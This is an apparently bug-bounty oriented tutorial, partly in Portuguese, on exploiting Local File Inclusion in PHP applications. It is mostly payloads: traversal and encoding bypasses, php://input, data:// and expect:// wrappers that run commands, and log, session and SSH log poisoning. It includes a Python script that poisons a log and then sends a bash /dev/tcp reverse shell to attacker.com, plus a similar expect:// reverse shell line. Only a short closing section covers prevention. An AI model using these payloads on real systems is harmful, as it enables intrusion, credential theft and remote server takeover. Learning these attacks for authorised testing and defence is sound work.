# Local File Inclusion (LFI)

**Criticidade**: 🔴 Crítica (CVSS 7.5-9.5)
**Dificuldade**: 🟡 Intermediária
**Bounty Médio**: $2,000 - $15,000 USD

---

## 📚 Índice

1. [LFI Fundamentals](#lfi-fundamentals)
2. [Path Traversal Techniques](#path-traversal-techniques)
3. [Null Byte Injection](#null-byte-injection)
4. [PHP Wrappers](#php-wrappers)
5. [LFI to RCE](#lfi-to-rce)
6. [Log Poisoning](#log-poisoning)
7. [Filter Bypass](#filter-bypass)
8. [Real-World Cases](#real-world-cases)

---

## 🔬 LFI Fundamentals

### O Que É Local File Inclusion?

**Local File Inclusion (LFI)** ocorre quando uma aplicação **inclui arquivos do servidor** baseado em **entrada do usuário** sem validação adequada, permitindo acesso a **arquivos arbitrários**.

**Vulnerable Code:**

```php
<?php
// ❌ VULNERABLE
$page = $_GET['page'];
include($page . ".php");
?>
```

**Normal Usage:**
```
GET /index.php?page=home
→ Includes: home.php
```

**Attack:**
```
GET /index.php?page=../../../../etc/passwd
→ Includes: ../../../../etc/passwd.php (fails)

GET /index.php?page=../../../../etc/passwd%00
→ Includes: ../../../../etc/passwd (null byte truncates .php)
```

**Why Dangerous:**

```
✓ Read sensitive files (/etc/passwd, /etc/shadow, config files)
✓ Source code disclosure
✓ Database credentials
✓ Session files
✓ SSH keys
✓ Potential RCE (via log poisoning, upload + include)
```

---

## 🔀 Path Traversal Techniques

### Basic Traversal

**Payload:**
```
../../../../etc/passwd
```

**How It Works:**
```
Current dir: /var/www/html/pages/
Requested: ../../../../etc/passwd

Traversal:
/var/www/html/pages/ + ../../../../etc/passwd
= /var/www/html/pages/../../../ ../etc/passwd
= /var/www/html/pages/../../ ../../etc/passwd
= /var/www/html/pages/../ ../../../etc/passwd
= /var/www/html/ ../../../../etc/passwd
= /var/www/ ../../../etc/passwd
= /var/ ../../etc/passwd
= / ../etc/passwd
= /etc/passwd ✓
```

### Encoding Variations

**URL Encoding:**
```
..%2F..%2F..%2F..%2Fetc%2Fpasswd
```

**Double URL Encoding:**
```
..%252F..%252F..%252F..%252Fetc%252Fpasswd
```

**16-bit Unicode Encoding:**
```
..%u002F..%u002F..%u002F..%u002Fetc%u002Fpasswd
```

**UTF-8 Encoding:**
```
..%c0%af..%c0%af..%c0%af..%c0%afetc%c0%afpasswd
```

### Absolute Paths

**Instead of relative:**
```
/etc/passwd
/var/www/html/config.php
C:\Windows\System32\drivers\etc\hosts
```

### Mixed Techniques

**Absolute + Traversal:**
```
/var/www/html/../../../../etc/passwd
```

**Why?** Some filters only check for `../`, but allow absolute paths.

---

## 🚫 Null Byte Injection

### The Null Byte Trick

**Problem:** Application appends extension

```php
<?php
$file = $_GET['file'];
include($file . ".php");  // Appends .php
?>
```

**Solution (PHP < 5.3.4):** Null byte (`%00`)

```
GET /index.php?file=../../../../etc/passwd%00
```

**How It Works:**

```
In C-based languages (PHP uses C):
- Strings terminated by null byte (\x00)
- Everything after \x00 is ignored

Payload: ../../../../etc/passwd%00
After decode: ../../../../etc/passwd\x00.php
PHP sees: ../../../../etc/passwd (stops at \x00)
```

**Other Extensions:**

```
file.txt%00.php
file.txt%00.html
file.txt%00.jpg
```

---

## 🔌 PHP Wrappers

### php://filter

**Purpose:** Read file contents with encoding

**Basic Usage:**
```
php://filter/convert.base64-encode/resource=index.php
```

**Read Source Code:**
```php
GET /index.php?page=php://filter/convert.base64-encode/resource=config
→ Returns base64-encoded config.php source code
```

**Decode:**
```bash
echo "PD9waHAKJGRiX3VzZXIgPSAicm9vdCI7..." | base64 -d
# Output:
# <?php
# $db_user = "root";
# $db_pass = "secret123";
```

**Multiple Filters:**
```
php://filter/convert.iconv.utf-8.utf-16/resource=config.php
php://filter/string.rot13/resource=config.php
php://filter/zlib.deflate/resource=config.php
```

### php://input

**Purpose:** Read POST data as file

**Exploit:**

```http
POST /index.php?page=php://input HTTP/1.1
Content-Type: application/x-www-form-urlencoded

<?php system($_GET['cmd']); ?>
```

**Result:** PHP code in POST body is executed!

**RCE:**
```
GET /index.php?page=php://input&cmd=whoami
POST data: <?php system($_GET['cmd']); ?>
→ Executes: whoami
```

### php://data

**Purpose:** Include arbitrary data as file

**Exploit:**
```
GET /index.php?page=data://text/plain,<?php system($_GET['cmd']); ?>&cmd=id
```

**Or with base64:**
```
GET /index.php?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+&cmd=id
```

**Decode base64:**
```bash
echo "PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+" | base64 -d
# <?php system($_GET['cmd']); ?>
```

### expect://

**Purpose:** Execute commands (if expect extension loaded)

**Exploit:**
```
GET /index.php?page=expect://whoami
→ Executes: whoami
```

**Reverse Shell:**
```
GET /index.php?page=expect://bash -c 'bash -i >& /dev/tcp/attacker.com/4444 0>&1'
```

### zip:// and phar://

**Purpose:** Include files from archives

**Create Malicious ZIP:**
```php
<?php
file_put_contents("shell.php", "<?php system($_GET['cmd']); ?>");
$zip = new ZipArchive();
$zip->open("exploit.zip", ZipArchive::CREATE);
$zip->addFile("shell.php");
$zip->close();
?>
```

**Upload exploit.zip, then:**
```
GET /index.php?page=zip://uploads/exploit.zip%23shell&cmd=id
                             ↑ uploaded file   ↑ file inside zip
```

---

## 💥 LFI to RCE

### Method 1: Log Poisoning

**Apache Access Log:**

**Step 1: Inject PHP code into User-Agent**
```http
GET /index.php HTTP/1.1
User-Agent: <?php system($_GET['cmd']); ?>
```

**Apache logs this:**
```
192.168.1.100 - - [01/Jan/2024:12:00:00 +0000] "GET /index.php HTTP/1.1" 200 1234 "-" "<?php system($_GET['cmd']); ?>"
```

**Step 2: Include log file**
```
GET /index.php?page=../../../../var/log/apache2/access.log&cmd=whoami
```

**Result:** PHP code in log executes!

**Other Logs:**
```
/var/log/apache2/access.log
/var/log/apache2/error.log
/var/log/nginx/access.log
/var/log/nginx/error.log
/var/log/httpd/access_log
/var/log/httpd/error_log
/usr/local/apache/logs/access_log
C:\xampp\apache\logs\access.log
```

### Method 2: Session File Poisoning

**PHP Sessions:**
```
/var/lib/php/sessions/sess_[session_id]
```

**Step 1: Create session with PHP code**
```php
<?php
session_start();
$_SESSION['username'] = '<?php system($_GET["cmd"]); ?>';
?>
```

**Session file contains:**
```
username|s:31:"<?php system($_GET["cmd"]); ?>";
```

**Step 2: Include session file**
```
GET /index.php?page=../../../../var/lib/php/sessions/sess_abc123&cmd=id
```

### Method 3: File Upload + LFI

**Step 1: Upload file with PHP code**
```php
// Upload image with PHP in metadata
<?php system($_GET['cmd']); ?>
```

**Step 2: Include uploaded file**
```
GET /index.php?page=../../../../uploads/malicious.jpg&cmd=whoami
```

### Method 4: /proc/self/environ

**Inject PHP into environment variable:**
```http
GET /index.php HTTP/1.1
User-Agent: <?php system($_GET['cmd']); ?>
```

**Include /proc/self/environ:**
```
GET /index.php?page=../../../../proc/self/environ&cmd=id
```

**Environment contains:**
```
HTTP_USER_AGENT=<?php system($_GET['cmd']); ?>
```

---

## 🧪 Log Poisoning

### Apache/Nginx Log Poisoning

**Full Exploitation:**

```python
import requests

target = "http://vulnerable.com/index.php?page="

# Step 1: Poison log with PHP code
headers = {
    'User-Agent': '<?php system($_GET["cmd"]); ?>'
}
requests.get("http://vulnerable.com/", headers=headers)

# Step 2: Include log file and execute command
log_paths = [
    "../../../../var/log/apache2/access.log",
    "../../../../var/log/nginx/access.log",
]

for log_path in log_paths:
    url = target + log_path + "&cmd=whoami"
    response = requests.get(url)

    if "www-data" in response.text or "root" in response.text:
        print(f"[+] Log poisoning successful: {log_path}")
        print(response.text)

        # Get reverse shell
        reverse_shell = "bash -c 'bash -i >& /dev/tcp/attacker.com/4444 0>&1'"
        requests.get(f"{url.replace('whoami', reverse_shell)}")
        break
```

### SSH Log Poisoning

**SSH logs failed login attempts:**
```
/var/log/auth.log
```

**Step 1: SSH with PHP in username**
```bash
ssh '<?php system($_GET["cmd"]); ?>'@target.com
```

**Log entry:**
```
Failed password for <?php system($_GET["cmd"]); ?> from 192.168.1.100 port 22
```

**Step 2: Include auth.log**
```
GET /index.php?page=../../../../var/log/auth.log&cmd=id
```

### Email Log Poisoning

**SMTP logs:**
```
/var/log/mail.log
```

**Step 1: Send email with PHP in header**
```python
import smtplib

msg = """From: <?php system($_GET["cmd"]); ?>@evil.com
To: victim@target.com
Subject: Test

Test email
"""

server = smtplib.SMTP('target.com', 25)
server.sendmail('attacker@evil.com', 'victim@target.com', msg)
```

**Step 2: Include mail.log**
```
GET /index.php?page=../../../../var/log/mail.log&cmd=whoami
```

---

## 🛡️ Filter Bypass

### Bypass 1: Strip `../`

**Filter:**
```php
$file = str_replace("../", "", $_GET['file']);
```

**Bypass:** Double encoding
```
....//....//....//....//etc/passwd
```

**Why:** After `str_replace`:
```
....//....//....//....//etc/passwd
→ ../../../etc/passwd
```

### Bypass 2: Blacklist Extensions

**Filter:**
```php
$file = $_GET['file'];
if (strpos($file, '.php') !== false) {
    die("Blocked!");
}
include($file);
```

**Bypass:** Case variation
```
file.PhP
file.pHp
file.PHP
```

**Bypass:** Null byte (old PHP)
```
file.txt%00.php
```

### Bypass 3: Whitelist Extensions

**Filter:**
```php
$file = $_GET['file'];
if (!preg_match('/\.(php|html)$/', $file)) {
    die("Only .php or .html allowed");
}
include($file);
```

**Bypass:** php://filter
```
php://filter/convert.base64-encode/resource=config.php
```

**Bypass:** Double extension
```
shell.php.html
```

---

## 🔥 Real-World Cases

### Case 1: WordPress Plugin LFI (2019)

**Vulnerability:** File download feature

**Code:**
```php
$file = $_GET['file'];
include("/var/www/wordpress/wp-content/uploads/" . $file);
```

**Exploitation:**
```
GET /wp-admin/admin.php?file=../../../../wp-config.php
```

**Impact:** Database credentials leaked

**Affected:** 100,000+ sites

### Case 2: Joomla! LFI to RCE (2015)

**Vulnerability:** Session deserialization

**Attack Chain:**
1. LFI to read session file
2. Craft malicious session
3. Trigger deserialization → RCE

**Bounty:** $3,000 USD

### Case 3: GitLab LFI (2020)

**Vulnerability:** Arbitrary file read via project import

**Exploitation:**
```
POST /import/gitlab_project
file_path=../../../../etc/passwd
```

**Impact:** Read server configuration, SSH keys

**Bounty:** $12,000 USD

---

## 🛡️ Prevention

### 1. Avoid Dynamic Includes

```php
// ❌ VULNERABLE
$page = $_GET['page'];
include($page . ".php");

// ✅ SECURE: Whitelist
$allowed = ['home', 'about', 'contact'];
$page = $_GET['page'];

if (in_array($page, $allowed)) {
    include($page . ".php");
} else {
    die("Invalid page");
}
```

### 2. Validate Input

```php
// ✅ Only allow alphanumeric
if (!preg_match('/^[a-zA-Z0-9]+$/', $_GET['file'])) {
    die("Invalid filename");
}
```

### 3. Use Realpath

```php
// ✅ Resolve path and check if inside safe directory
$safe_dir = '/var/www/html/pages/';
$file = $_GET['file'];
$realpath = realpath($safe_dir . $file);

if (strpos($realpath, $safe_dir) === 0) {
    include($realpath);
} else {
    die("Access denied");
}
```

---

**Última atualização**: 2024
**Versão**: 1.0
